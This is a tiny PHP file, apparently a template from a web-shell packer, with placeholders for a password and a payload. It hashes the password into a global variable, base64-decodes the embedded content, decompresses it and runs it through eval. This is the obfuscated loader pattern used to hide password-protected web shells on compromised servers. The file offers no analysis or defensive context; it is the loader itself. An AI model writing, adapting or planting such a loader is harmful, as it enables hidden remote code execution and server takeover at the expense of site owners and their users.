<?php
$GLOBALS['pass'] = hash("sha256", "{{PASSWORD}}");
$cm = base64_decode('{{CONTENT}}');
function b6($x){
    return eval("?>".gzinflate($x));
}
b6($cm);